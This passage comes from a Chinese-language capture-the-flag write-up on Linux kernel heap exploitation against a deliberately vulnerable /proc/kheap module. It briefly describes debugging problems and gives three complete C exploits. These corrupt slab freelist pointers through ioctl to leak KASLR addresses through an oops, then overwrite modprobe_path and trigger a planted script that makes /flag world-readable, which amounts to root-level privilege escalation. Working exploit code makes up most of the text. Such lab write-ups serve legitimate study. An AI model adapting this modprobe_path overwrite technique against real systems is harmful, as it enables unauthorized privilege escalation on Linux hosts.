然后我就经历了比chrome v8还噩梦的调试过程。虽然已成功修改`modprobe_path`，但运行时kernel要么崩溃要么直接卡死。前者倒还好，后者直接导致整个session废了，需要重新开一个ssh。然而新的ssh对应的还是同一个实例，失败的exp直接把堆搞乱了，之后再怎么修改都没法成功。只能出去运行`vm restart`。但是`vm restart`后再start再connect后发现登录的还是同一个实例（dmesg打印出来的内容是一样的）？换成`vm stop`后好了些，但仍然会遇到kernel卡死或是vm debug连接不上的情况。这个时候我选择直接退出去重新开一个practice环境。听起来不是很复杂，但考虑每条命令运行的耗时都慢得要死，整个过程就是纯纯折磨

最后找到了原因。`kmem_cache_alloc`会清空分配到的堆块，而`modprobe_path`后存在有用的数据。解决办法是gdb调试查看原本的值是什么，然后全部恢复
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
void prepare_modprobe_files() {
    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("printf '\xff\xff\xff\xff' > /tmp/dummy"); //不知道为什么echo -ne不行
    system("chmod +x /tmp/dummy");
}
const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
    const char *ptr = (const char *)buffer;
    size_t num_strings = buffer_size / 8;
    for (size_t i = 0; i < num_strings; i++) {
        const char *current_str = ptr + (i * 8);
        if(current_str[1]!=0){
            printf("Found 8-byte string at offset %zu: ", i * 8);
            for (int j = 0; j < 8; j++) {
                printf("%02x ", (unsigned char)current_str[j]); 
            }
            printf("\n");
            return current_str;
        }
    }
    return NULL;
}
uint64_t binary_string_to_u64(const char *binary_str) {
    uint64_t result;
    memcpy(&result, binary_str, 8);
    return result;
}
void u64_to_binary_string(uint64_t num, char *output) {
    memcpy(output, &num, 8);
}
int main() {
    prepare_modprobe_files();
    uint64_t modprobe=0xffffffff89e58c20+0xe68a0-0x40;
    printf("modprobe: %llx\n",modprobe);
    char buf[0x1d0];
    int fd_count=2;
    unsigned long arg[2];
    int fds[fd_count];
    for(int i=0;i<fd_count;i++){
        fds[i]=open("/proc/kheap", O_RDWR);
    }
    arg[0]=(unsigned long)buf;
    arg[1]=sizeof(buf);
    ioctl(fds[0],0x5703,arg);
    ioctl(fds[1],0x5703,arg);
    ioctl(fds[0],0x5700,arg);
    const char* leak=find_8byte_strings(buf, sizeof(buf));
    char *pos = memmem(buf,sizeof(buf), leak, 8);
    uint64_t info=binary_string_to_u64(leak);
    printf("info: %llx\n",info);
    char output[8];
    u64_to_binary_string(modprobe,output);
    memcpy(pos,output,8);
    ioctl(fds[0],0x5701,arg);
    memset(buf, 0, sizeof(buf));
    strcpy(buf+0x38,"/tmp/x");
    unsigned long *ul_buf = (unsigned long *)buf;
    int off=39;
    ul_buf[off++]=0x0000003200000000;
    ul_buf[off++]=modprobe+0x148;
    ul_buf[off++]=modprobe+0x148;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe+0x170;
    ul_buf[off++]=modprobe+0x170;
    ul_buf[off++]=1;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe-0x48172d;
    ul_buf[off++]=modprobe+0x220;
    ul_buf[off++]=0x000001a400000004;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe-0x1a0d0a0;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe-0x9310a0;
    int victim_count=14;
    int victimFds[victim_count];
    for(int i=0;i<victim_count;i++){
        victimFds[i]=open("/proc/kheap", O_RDWR);
        ioctl(victimFds[i],0x5701,arg);
    }
    puts("Done overwriting");
    system("/tmp/dummy");
    system("cat /flag");
    for(int i=0;i<fd_count;i++){
        close(fds[i]);
    }
    for(int i=0;i<victim_count;i++){
        close(victimFds[i]);
    }
    return 0;
}
```
### Level-4

ioctl中取消了调用函数指针的操作，但是我上一题的exp本来就没怎么用这个功能，所以稍微改一下昨天的脚本就能用了

需要修改如何泄漏kaslr。直接篡改堆块的链表指针为一个无效的kernel地址，后续分配到那块地址时就会触发oops了（这么看来我昨天还写复杂了）
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
    const char *ptr = (const char *)buffer;
    size_t num_strings = buffer_size / 8;
    for (size_t i = 0; i < num_strings; i++) {
        const char *current_str = ptr + (i * 8);
        if(current_str[1]!=0){
            for (int j = 0; j < 8; j++) {
                printf("%02x ", (unsigned char)current_str[j]); 
            }
            return current_str;
        }
    }
    return NULL;
}
int main() {
    char buf[0x1d0];
    int fd_count=2;
    unsigned long arg[2];
    int fds[fd_count];
    for(int i=0;i<fd_count;i++){
        fds[i]=open("/proc/kheap", O_RDWR);
    }
    arg[0]=(unsigned long)buf;
    arg[1]=sizeof(buf);
    ioctl(fds[0],0x5703,arg);
    ioctl(fds[1],0x5703,arg);
    ioctl(fds[0],0x5700,arg);
    const char* leak=find_8byte_strings(buf, sizeof(buf));
    char *pos = memmem(buf,sizeof(buf), leak, 8);
    memcpy(pos,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
    ioctl(fds[0],0x5701,arg);
    int victim_count=6;
    int victimFds[victim_count];
    for(int i=0;i<victim_count;i++){
        victimFds[i]=open("/proc/kheap", O_RDWR);
    }
    return 0;
}
```
甚至泄漏的寄存器信息中还是r10包含有用的地址，且这个地址与modprobe_path的偏移和上一题一样
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
void prepare_modprobe_files() {
    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("printf '\xff\xff\xff\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
}
const char* find_8byte_strings(const void *buffer, size_t buffer_size) {
    const char *ptr = (const char *)buffer;
    size_t num_strings = buffer_size / 8;
    for (size_t i = 0; i < num_strings; i++) {
        const char *current_str = ptr + (i * 8);
        if(current_str[1]!=0){
            for (int j = 0; j < 8; j++) {
                printf("%02x ", (unsigned char)current_str[j]); 
            }
            return current_str;
        }
    }
    return NULL;
}
void u64_to_binary_string(uint64_t num, char *output) {
    memcpy(output, &num, 8);
}
int main() {
    prepare_modprobe_files();
    uint64_t modprobe=0xffffffff9da58c20+0xe68a0-0x40;
    char buf[0x1d0];
    int fd_count=2;
    unsigned long arg[2];
    int fds[fd_count];
    for(int i=0;i<fd_count;i++){
        fds[i]=open("/proc/kheap", O_RDWR);
    }
    arg[0]=(unsigned long)buf;
    arg[1]=sizeof(buf);
    ioctl(fds[0],0x5703,arg);
    ioctl(fds[1],0x5703,arg);
    ioctl(fds[0],0x5700,arg);
    const char* leak=find_8byte_strings(buf, sizeof(buf));
    char *pos = memmem(buf,sizeof(buf), leak, 8);
    char output[8];
    u64_to_binary_string(modprobe,output);
    memcpy(pos,output,8);
    ioctl(fds[0],0x5701,arg);
    memset(buf, 0, sizeof(buf));
    strcpy(buf+0x40,"/tmp/x");
    unsigned long *ul_buf = (unsigned long *)buf;
    int off=40;
    ul_buf[off++]=0x0000003200000000;
    ul_buf[off++]=modprobe+0x148;
    ul_buf[off++]=modprobe+0x148;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe+0x170;
    ul_buf[off++]=modprobe+0x170;
    ul_buf[off++]=1;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe-0x48172d;
    ul_buf[off++]=modprobe+0x220;
    ul_buf[off++]=0x000001a400000004;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe-0x1a0d0a0;
    ul_buf[off++]=0;
    ul_buf[off++]=modprobe-0x9310a0;
    int victim_count=6;
    int victimFds[victim_count];
    for(int i=0;i<victim_count;i++){
        victimFds[i]=open("/proc/kheap", O_RDWR);
        ioctl(victimFds[i],0x5701,arg);
    }
    system("/tmp/dummy");
    system("cat /flag");
    for(int i=0;i<fd_count;i++){
        close(fds[i]);
    }
    for(int i=0;i<victim_count;i++){
        close(victimFds[i]);
    }
    return 0;
}
```